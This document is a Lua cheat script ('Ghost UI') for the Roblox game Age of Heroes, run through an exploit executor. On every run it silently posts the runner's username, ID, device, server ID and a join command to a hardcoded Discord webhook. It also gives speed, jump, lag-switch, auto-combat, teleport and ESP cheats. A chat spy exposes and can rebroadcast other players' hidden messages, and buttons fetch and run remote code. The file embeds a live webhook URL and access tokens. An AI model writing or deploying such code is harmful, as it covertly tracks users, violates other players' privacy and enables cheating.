local isAllowed = true
local url = "https://discord.com/api/webhooks/1315721967134838784/5XQWNux0pAqdGAiX8Ipwcwp30s4VoR4fgtLMzHa4esCzeBg4Ium33_rna2kSckLFJZ9p"
local player = game.Players.LocalPlayer;
function SendMessageEMBED(url, embed)
	local http = game:GetService("HttpService");
	local headers = {
		["Content-Type"] = "application/json"
	};
	local data = {
		embeds = {
			{
				title = embed.title,
				color = embed.color,
				fields = embed.fields,
				footer = {
					text = embed.footer.text
				}
			}
		}
	};
	local body = http:JSONEncode(data);
	local response = request({
		Url = url,
		Method = "POST",
		Headers = headers,
		Body = body
	});
	print("Executed");
end
local gameNumber = game.PlaceId
local jobId = game.JobId
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

if isAllowed then
	local playerCreationTime = player.AccountAge * 86400 -- AccountAge gives days, convert to seconds (Unix timestamp approximation)
	local accountCreationUnixTime = os.time() - playerCreationTime
	local UserInputService = game:GetService("UserInputService")
	local function getOperatingSystem()
		local platform = UserInputService:GetPlatform()
		local os = "Unknown"
		if platform == Enum.Platform.Windows then
			os = "Windows"
		elseif platform == Enum.Platform.OSX then
			os = "macOS"
		elseif platform == Enum.Platform.IOS then
			os = "iOS"
		elseif platform == Enum.Platform.Android then
			os = "Android"
		end
		return os
	end
	local embedSuccess = {
		title = "Script Execution Report: Success | CODE:200",
		color = 65280,
		fields = {
			{
				name = "Player Name",
				value = "\`\`\`\n" .. player.Name .. "\n\`\`\`",
				inline = true
			},
			{
				name = "Player Id",
				value = "\`\`\`\n" .. tostring(player.UserId) .. "\n\`\`\`",
				inline = true
			},
			{
				name = "Account Creation",
				value = "<t:" .. tostring(accountCreationUnixTime) .. ":F>",
				inline = true
			},
			{
				name = "Current Level",
				value = "\`\`\`\n" .. game.Players.LocalPlayer.leaderstats.Level.Value .. "\n\`\`\`",
				inline = true
			},
			{
				name = "Device",
				value = "\`\`\`\n" .. getOperatingSystem() .. "\n\`\`\`",
				inline = true
			},
			{
				name = "Resolution",
				value = "\`\`\`\n" .. tostring(workspace.CurrentCamera.ViewportSize.X) .. "x" .. tostring(workspace.CurrentCamera.ViewportSize.Y) .. "\n\`\`\`",
				inline = true
			},
			{
				name = "Game Name",
				value = "**[" .. ((game:GetService("MarketplaceService")):GetProductInfo(game.PlaceId)).Name .. "](https://www.roblox.com/games/" .. tostring(game.PlaceId) .. "/Age-of-Heroes)**",
				inline = true
			},
			{
				name = "Game Id",
				value = "\`\`\`\n" .. tostring(game.GameId) .. "\n\`\`\`",
				inline = true
			},
			{
				name = "Place Id",
				value = "\`\`\`\n" .. tostring(game.PlaceId) .. "\n\`\`\`",
				inline = true
			},
			{
				name = "Server Id",
				value = "\`\`\`\n" .. tostring(jobId) .. "\n\`\`\`",
				inline = false
			},
			{
				name = "Copy and pate in any executor to join " .. player.Name .. "'s Game",
				value = '```lua\ngame:GetService("TeleportService"):TeleportToPlaceInstance(' .. tostring(gameNumber) .. ', "' .. tostring(jobId) .. '", game.Players.LocalPlayer)\n```',
				inline = false
			}
		},
		footer = {
			text = "Timestamp: " .. os.date("%Y-%m-%d %X")
		}
	};
	SendMessageEMBED(url, embedSuccess);
	local Fluent = (loadstring(game:HttpGet("https://raw.githubusercontent.com/ItzAmanKoushal/Nyxus/main/Assets/Fluent/Library.lua")))();
	local SaveManager = (loadstring(game:HttpGet("https://raw.githubusercontent.com/ItzAmanKoushal/Nyxus/main/Assets/Fluent/Addons/SaveManager.lua")))();
	local InterfaceManager = (loadstring(game:HttpGet("https://raw.githubusercontent.com/ItzAmanKoushal/Nyxus/main/Assets/Fluent/Addons/InterfaceManager.lua")))();
	local Script = {
		Version = 7.8,
		Author = "._m4n",
		Loadstring = "not attained yet!",
		IsEnabled = true,
		IsOwner = false
	};
	local Window = Fluent:CreateWindow({
		Title = "Ghost UI - " .. Script.Version,
		SubTitle = Script.Author,
		TabWidth = 160,
		Size = UDim2.fromOffset(580, 300),
		Acrylic = true,
		Theme = "Darker",
		MinimizeKey = Enum.KeyCode.LeftControl
	});
	local UserInputService = game:GetService("UserInputService");
	function breakvelocity()
		spawn(function()
			local BeenASecond, V3 = false, Vector3.new(0, 0, 0);
			delay(1, function()
				BeenASecond = true;
			end);
			while not BeenASecond do
				for _, v in ipairs(player.Character:GetDescendants()) do
					if v.IsA(v, "BasePart") then
						v.Velocity, v.RotVelocity = V3, V3;
					end
				end
				wait();
			end
		end);
	end
	local Tabs = {
		PvP = Window:AddTab({
			Title = "PvP Modifications",
			Icon = "swords"
		}),
		OtherScripts = Window:AddTab({
			Title = "Other Scripts",
			Icon = "align-justify"
		}),
		Settings = Window:AddTab({
			Title = "Settings",
			Icon = "settings"
		})
	};
	local Options = Fluent.Options;
	do
		local SpeedSlider = Tabs.PvP:AddSlider("SpeedSlider", {
			Title = "Speed Changer",
			Description = "Adjust the speed of the character using this slider.",
			Default = 16,
			Min = 1,
			Max = 16,
			Rounding = 0,
			Callback = function(Value)
				print("Slider was changed:", Value);
			end
		});
		SpeedSlider:OnChanged(function(Value)
			game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = Value;
		end);

		local function handleMetalToggle(Value)
			if Fluent.Unloaded then
				return;
			elseif Value then
				game:GetService("ReplicatedStorage").Events.Transform:FireServer("metalSkin", true);
			else
				(game:GetService("ReplicatedStorage")).Events.Transform:FireServer("metalSkin", false);
			end
		end
		local MetalKeybind = Tabs.PvP:AddKeybind("Keybind", {
			Title = "Metal",
			Mode = "Toggle",
			Default = "R"
		});
		MetalKeybind:OnClick(handleMetalToggle);
		MetalKeybind:OnChanged(function()
			Fluent:Notify({
				Title = "Ghost UI Notification",
				Content = "The keybinding of metalskin had been changed to " .. MetalKeybind.Value,
				SubContent = "This can be changed again!",
				Duration = 5
			});
		end);

		-- Keybind and Chat Spy Integration
		local Config = {
			enabled = false,
			spyOnMyself = false,
			public = false,
			publicItalics = true
		}

-- Private Properties for Chat Output
		local PrivateProperties = {
			Color = Color3.fromRGB(255, 174, 0),
			Font = Enum.Font.SourceSansBold,
			TextSize = 18,
			Text = ""
		}
		local StarterGui = game:GetService("StarterGui")
		local Players = game:GetService("Players")
		local player = Players.LocalPlayer
		local saymsg = game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest")
		local getmsg = game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("OnMessageDoneFiltering")
		local instance = (_G.chatSpyInstance or 0) + 1
		_G.chatSpyInstance = instance
		local function onChatted(p, msg)
			if _G.chatSpyInstance == instance then
				if Config.enabled and (Config.spyOnMyself or p ~= player) then
					msg = msg:gsub("[\n\r]", ''):gsub("\t", ' '):gsub("[ ]+", ' ')
					local hidden = true
					local conn = getmsg.OnClientEvent:Connect(function(packet, channel)
						if packet.SpeakerUserId == p.UserId and packet.Message == msg:sub(# msg - # packet.Message + 1) and (channel == "All" or (channel == "Team" and not Config.public and Players[packet.FromSpeaker].Team == player.Team)) then
							hidden = false
						end
					end)
					wait(1)
					conn:Disconnect()
					if hidden and Config.enabled then
						if Config.public then
							saymsg:FireServer((Config.publicItalics and "/me " or '') .. "{SPY} [" .. p.Name .. "]: " .. msg, "All")
						else
							PrivateProperties.Text = "{SPY} [" .. p.Name .. "]: " .. msg
							StarterGui:SetCore("ChatMakeSystemMessage", PrivateProperties)
						end
					end
				end
			end
		end
		for _, p in ipairs(Players:GetPlayers()) do
			p.Chatted:Connect(function(msg)
				onChatted(p, msg)
			end)
		end
		Players.PlayerAdded:Connect(function(p)
			p.Chatted:Connect(function(msg)
				onChatted(p, msg)
			end)
		end)

-- Keybind Logic
		local function handleSpyToggle(Value)
			if Fluent.Unloaded then
				return
			elseif Value then
				Config.enabled = true
				PrivateProperties.Text = "{SPY ENABLED}"
				StarterGui:SetCore("ChatMakeSystemMessage", PrivateProperties)
			else
				Config.enabled = false
				PrivateProperties.Text = "{SPY DISABLED}"
				StarterGui:SetCore("ChatMakeSystemMessage", PrivateProperties)
			end
		end
		local SpyKeybind = Tabs.PvP:AddKeybind("Keybind", {
			Title = "Chat Spy",
			Mode = "Toggle",
			Default = "KeypadThree"
		})
		SpyKeybind:OnClick(handleSpyToggle)
		SpyKeybind:OnChanged(function()
			Fluent:Notify({
				Title = "Ghost UI Notification",
				Content = "The keybinding of chat spy has been changed to " .. SpyKeybind.Value,
				SubContent = "This can be changed again!",
				Duration = 5
			})
		end)

		local db = false

local function handleLagToggle()
    if Fluent.Unloaded then
        return
    end

    db = not db
    pcall(function()
        settings():GetService("NetworkSettings").IncomingReplicationLag = db and math.huge or 0
    end)

end

local LagKeybind = Tabs.PvP:AddKeybind("keybind", {
    Title = "Lag",
    Mode = "Toggle",
    Default = "Y"
})

LagKeybind:OnClick(handleLagToggle)
LagKeybind:OnChanged(function()
    Fluent:Notify({
        Title = "Ghost UI Notification",
        Content = "The keybinding of Lag has been changed to " .. LagKeybind.Value,
        Duration = 5
    })
end)


		local function handleMaskToggle()
			if Fluent.Unloaded then
				return;
			end
			spawn(function()
				(game:GetService("ReplicatedStorage")).Events.ToggleTelekinesis:InvokeServer(Vector3.new(0, 0, 0), false, game.Players[game.Players.LocalPlayer.Name].Character);
			end);
		end
		local MaskKeybind = Tabs.PvP:AddKeybind("keybind", {
			Title = "Mask",
			Mode = "Toggle",
			Default = "KeypadTwo"
		});
		MaskKeybind:OnClick(handleMaskToggle);
		MaskKeybind:OnChanged(function()
			Fluent:Notify({
				Title = "Ghost UI Notification",
				Content = "The keybinding of mask had been changed to " .. MaskKeybind.Value,
				SubContent = "This can be changed again!",
				Duration = 5
			});
		end);

		local infJump
		local infJumpDebounce = false
		local screenGui = Instance.new("ScreenGui")
		screenGui.Parent = game.CoreGui
		local botFrame = Instance.new("Frame")
		botFrame.Position = UDim2.new(0, 1, 1, -5)
		botFrame.Size = UDim2.new(0, 5, 0, 5)
		botFrame.BackgroundColor3 = Color3.new(0.35294117647058826, 0.35294117647058826, 0.35294117647058826)
		botFrame.Visible = false
		botFrame.Parent = screenGui
		local function handleInfJump(state)
			if Fluent.Unloaded then
				return
			end
			botFrame.Visible = state
			if state then
				infJumpDebounce = false
				infJump = UserInputService.JumpRequest:Connect(function()
					if not infJumpDebounce then
						infJumpDebounce = true
						local humanoid = game.Players.LocalPlayer.Character:FindFirstChildWhichIsA("Humanoid")
						if humanoid then
							humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
						end
						wait()
						infJumpDebounce = false
					end
				end)
			elseif infJump then
				infJump:Disconnect()
				infJump = nil
			end
		end

        -- Update to handle key press and release
		local InfJumpKeybind = Tabs.PvP:AddKeybind("keybind", {
			Title = "Inf Jump",
			Mode = "Hold", -- Update mode to "Hold"
			Default = "KeypadOne"
		})
		InfJumpKeybind:OnClick(handleInfJump)
		InfJumpKeybind:OnChanged(function()
			Fluent:Notify({
				Title = "Ghost UI Notification",
				Content = "The keybinding of inf jump has been changed to " .. InfJumpKeybind.Value,
				SubContent = "This can be changed again!",
				Duration = 5
			})
		end)
		UserInputService.InputBegan:Connect(function(input)
			if input.KeyCode == Enum.KeyCode[InfJumpKeybind.Value] then
				handleInfJump(true)
			end
		end)
		UserInputService.InputEnded:Connect(function(input)
			if input.KeyCode == Enum.KeyCode[InfJumpKeybind.Value] then
				handleInfJump(false)
			end
		end)

		local NormalPunchKeybind = Tabs.PvP:AddKeybind("Keybind", {
			Title = "Fire Normal Punch",
			Mode = "Toggle",
			Default = "KeypadFour"
		});
		NormalPunchKeybind:OnClick(function()
			(game:GetService("ReplicatedStorage")).Events.Punch:FireServer(0, 0.1, 1);
		end);
		NormalPunchKeybind:OnChanged(function()
			Fluent:Notify({
				Title = "Ghost UI Notification",
				Content = "The keybinding of normal punch had been changed to " .. NormalPunchKeybind.Value,
				SubContent = "This can be changed again!",
				Duration = 5
			});
		end);

		local PunchKeybind = Tabs.PvP:AddKeybind("Keybind", {
			Title = "Fire Heavy Punch",
			Mode = "Toggle",
			Default = "KeypadFive"
		});
		PunchKeybind:OnClick(function()
			(game:GetService("ReplicatedStorage")).Events.Punch:FireServer(0.4, 0.1, 1);
		end);
		PunchKeybind:OnChanged(function()
			Fluent:Notify({
				Title = "Ghost UI Notification",
				Content = "The keybinding of fire punch had been changed to " .. PunchKeybind.Value,
				SubContent = "This can be changed again!",
				Duration = 5
			});
		end);

		local punchEvent = (game:GetService("ReplicatedStorage")).Events.Punch;
		local AutoCombat = Tabs.PvP:AddToggle("AutoCombat", {
			Title = "Auto Combat",
			Default = false
		});
		local IsAutoCombat = false;
		AutoCombat:OnChanged(function(state)
			IsAutoCombat = state;
		end);
		local AutoPunchSpeed = 5;
		local AutoPunchCooldown = 1;
		local AutoCombatSlider = Tabs.PvP:AddSlider("AutoCombatSlider", {
			Title = "Punch heartbeat changer",
			Description = "Adjust the punch heartbeat using this slider.",
			Default = 1,
			Min = 1,
			Max = 10,
			Rounding = 1,
			Callback = function(Value)
				print("Slider was changed:", Value);
			end
		});
		AutoCombatSlider:OnChanged(function(Value)
			AutoPunchSpeed = Value;
		end);

		local CombatClinetBind = Tabs.PvP:AddKeybind("CombatClinetBind", {
			Title = "Combat Client",
			Mode = "Toggle",
			Default = "KeypadSix"
		});
		local isHoldingKey = false;
		local function onKeyHold()
			while isHoldingKey do
				if IsAutoCombat then
					punchEvent:FireServer(0, 0.1, 1);
					wait(AutoPunchSpeed);
				else
					break
				end
			end
		end
		CombatClinetBind:OnClick(function()
		end);
		CombatClinetBind:OnChanged(function()
			Fluent:Notify({
				Title = "Ghost UI Notification",
				Content = "The keybinding of fire punch had been changed to " .. CombatClinetBind.Value,
				SubContent = "This can be changed again!",
				Duration = 5
			});
		end);
		UserInputService.InputBegan:Connect(function(input, processed)
			if not processed and input.KeyCode == Enum.KeyCode[CombatClinetBind.Value] then
				isHoldingKey = true;
				(coroutine.wrap(onKeyHold))();
			end
		end);
		UserInputService.InputEnded:Connect(function(input, processed)
			if not processed and input.KeyCode == Enum.KeyCode[CombatClinetBind.Value] then
				isHoldingKey = false;
			end
		end);

		local TpMidKeybind = Tabs.PvP:AddKeybind("keybind", {
			Title = "Tp Mid",
			Mode = "Toggle",
			Default = "KeypadSeven"
		});
		TpMidKeybind:OnClick(function()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-376, 594, 91);
			spawn(breakvelocity);
		end);

		local TpMotelKeybind = Tabs.PvP:AddKeybind("keybind", {
			Title = "Tp Motel",
			Mode = "Toggle",
			Default = "KeypadNine"
		});
		TpMotelKeybind:OnClick(function()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-1750, 594, -1349);
			spawn(breakvelocity);
		end);

		local NameEspToggle = Tabs.PvP:AddToggle("NameEspToggle", {
			Title = "UserName ESP",
			Default = false
		});
		local esp_settings = {
			textsize = 20
		};
		local gui = Instance.new("BillboardGui");
		local esp = Instance.new("TextLabel", gui);
		gui.Name = "esp";
		gui.ResetOnSpawn = false;
		gui.AlwaysOnTop = true;
		gui.LightInfluence = 0;
		gui.Size = UDim2.new(1.75, 0, 1.75, 0);
		esp.BackgroundColor3 = Color3.fromRGB(255, 255, 255);
		esp.Text = "";
		esp.Size = UDim2.new(0.0001, 0.00001, 0.0001, 0.00001);
		esp.BorderSizePixel = 4;
		esp.BorderColor3 = Color3.new(125, 218, 88);
		esp.BorderSizePixel = 0;
		esp.Font = "SourceSansSemibold";
		esp.TextSize = esp_settings.textsize;
		local espEnabled = false;
		local function getPlayerTeamColor(player)
			if player.Team then
				return player.Team.TeamColor.Color;
			end
			return Color3.fromRGB(255, 255, 255); -- Default color if no team is assigned
		end
		local function toggleESP(state)
			espEnabled = state;
			if not state then
				for _, player in pairs(game:GetService("Players"):GetPlayers()) do
					if player ~= game:GetService("Players").LocalPlayer and player.Character and player.Character:FindFirstChild("Head") then
						local head = player.Character.Head;
						if head:FindFirstChild("esp") then
							head.esp:Destroy();
						end
					end
				end
			end
		end
		NameEspToggle:OnChanged(function(state)
			toggleESP(state);
		end);
		game:GetService("RunService").RenderStepped:Connect(function()
			if espEnabled then
				for _, player in pairs(game:GetService("Players"):GetPlayers()) do
					if player ~= game:GetService("Players").LocalPlayer and player.Character and player.Character:FindFirstChild("Head") then
						local head = player.Character.Head;
						if not head:FindFirstChild("esp") then
							local clonedGui = gui:Clone();
							clonedGui.Parent = head;
							local clonedEsp = clonedGui:FindFirstChild("TextLabel");
							clonedEsp.Text = player.Name;
							clonedEsp.TextColor3 = getPlayerTeamColor(player);
						else
							local existingEsp = head:FindFirstChild("esp"):FindFirstChild("TextLabel");
							existingEsp.TextColor3 = getPlayerTeamColor(player);
						end
					end
				end
			end
		end);

		Tabs.OtherScripts:AddButton({
			Title = "Infinite Yield",
			Description = "A global script for Infinite Yield",
			Callback = function()
				Window:Dialog({
					Title = "Execute Infinite Yield",
					Content = "Do you want to execute the Infinite Yield script?",
					Buttons = {
						{
							Title = "Yes",
							Callback = function()
								(loadstring(game:HttpGet("https://raw.githubusercontent.com/ItzAmanKoushal/Nyxus-raw/main/Assets/iy.lua?token=GHSAT0AAAAAACTDFDBC5QRWEQL33PEHH76AZVHJMRQ")))();
							end
						},
						{
							Title = "No",
							Callback = function()
								print("Cancelled script execution.");
							end
						}
					}
				});
			end
		});
		Tabs.OtherScripts:AddButton({
			Title = "Script Nebbia",
			Description = "Script Nebbia by jose",
			Callback = function()
				Window:Dialog({
					Title = "Execute Script Nebbia",
					Content = "Do you want to execute the Script Nebbia?",
					Buttons = {
						{
							Title = "Yes",
							Callback = function()
								(loadstring(game:HttpGet("https://raw.githubusercontent.com/ItzAmanKoushal/Nyxus-raw/main/Assets/nebbia.lua?token=GHSAT0AAAAAACTDFDBCQMWNO3PDXIMXKYO6ZVHJNCA")))();
							end
						},
						{
							Title = "No",
							Callback = function()
								print("Cancelled script execution.");
							end
						}
					}
				});
			end
		});
		Tabs.OtherScripts:AddButton({
			Title = "Dex Explorer",
			Description = "Dex Explorer by moonlight",
			Callback = function()
				Window:Dialog({
					Title = "Execute Dex Explorer",
					Content = "Do you want to execute the Dex Explorer script?",
					Buttons = {
						{
							Title = "Yes",
							Callback = function()
								(loadstring((game:GetObjects("rbxassetid://2180084478"))[1].Source))();
							end
						},
						{
							Title = "No",
							Callback = function()
								print("Cancelled script execution.");
							end
						}
					}
				});
			end
		});
	end
	SaveManager:SetLibrary(Fluent);
	InterfaceManager:SetLibrary(Fluent);
	SaveManager:IgnoreThemeSettings();
	SaveManager:SetIgnoreIndexes({});
	InterfaceManager:SetFolder("FluentScriptHub");
	SaveManager:SetFolder("FluentScriptHub/specific-game");
	InterfaceManager:BuildInterfaceSection(Tabs.Settings);
	SaveManager:BuildConfigSection(Tabs.Settings);
	Window:SelectTab(1);
	Fluent:Notify({
		Title = "Ghost UI",
		Content = "The script has been loaded.",
		Duration = 8
	});
	SaveManager:LoadAutoloadConfig();

else
	local StarterGui = game:GetService("StarterGui");
	StarterGui:SetCore("SendNotification", {
		Title = "Alert!",
		Text = "You are not allowed to use the script.",
		Duration = 5,
		Button1 = "Okay"
	});
	local playerCreationTime = player.AccountAge * 86400 -- AccountAge gives days, convert to seconds (Unix timestamp approximation)
	local accountCreationUnixTime = os.time() - playerCreationTime
	local UserInputService = game:GetService("UserInputService")
	local function getOperatingSystem()
		local platform = UserInputService:GetPlatform()
		local os = "Unknown"
		if platform == Enum.Platform.Windows then
			os = "Windows"
		elseif platform == Enum.Platform.OSX then
			os = "macOS"
		elseif platform == Enum.Platform.IOS then
			os = "iOS"
		elseif platform == Enum.Platform.Android then
			os = "Android"
		end
		return os
	end
	local embedFail = {
		title = "Script Execution Report : Failed (Not Aurthorised) | CODE:405",
		color = 16711680,
		fields = {
			{
				name = "Player Name",
				value = "\`\`\`\n" .. player.Name .. "\n\`\`\`",
				inline = true
			},
			{
				name = "Player Id",
				value = "\`\`\`\n" .. tostring(player.UserId) .. "\n\`\`\`",
				inline = true
			},
			{
				name = "Account Creation",
				value = "<t:" .. tostring(accountCreationUnixTime) .. ":F>",
				inline = true
			},
			{
				name = "Current Level",
				value = "\`\`\`\n" .. game.Players.LocalPlayer.leaderstats.Level.Value .. "\n\`\`\`",
				inline = true
			},
			{
				name = "Device",
				value = "\`\`\`\n" .. getOperatingSystem() .. "\n\`\`\`",
				inline = true
			},
			{
				name = "Resolution",
				value = "\`\`\`\n" .. tostring(workspace.CurrentCamera.ViewportSize.X) .. "x" .. tostring(workspace.CurrentCamera.ViewportSize.Y) .. "\n\`\`\`",
				inline = true
			},
			{
				name = "Game Name",
				value = "**[" .. ((game:GetService("MarketplaceService")):GetProductInfo(game.PlaceId)).Name .. "](https://www.roblox.com/games/" .. tostring(game.PlaceId) .. "/Age-of-Heroes)**",
				inline = true
			},
			{
				name = "Game Id",
				value = "\`\`\`\n" .. tostring(game.GameId) .. "\n\`\`\`",
				inline = true
			},
			{
				name = "Place Id",
				value = "\`\`\`\n" .. tostring(game.PlaceId) .. "\n\`\`\`",
				inline = true
			},
			{
				name = "Server Id",
				value = "\`\`\`\n" .. tostring(jobId) .. "\n\`\`\`",
				inline = false
			},
			{
				name = "Copy and pate in any executor to join " .. player.Name .. "'s Game",
				value = '```lua\ngame:GetService("TeleportService"):TeleportToPlaceInstance(' .. tostring(gameNumber) .. ', "' .. tostring(jobId) .. '", game.Players.LocalPlayer)\n```',
				inline = false
			}
		},
		footer = {
			text = "Timestamp: " .. os.date("%Y-%m-%d %X")
		}
	};
	SendMessageEMBED(url, embedFail);
end
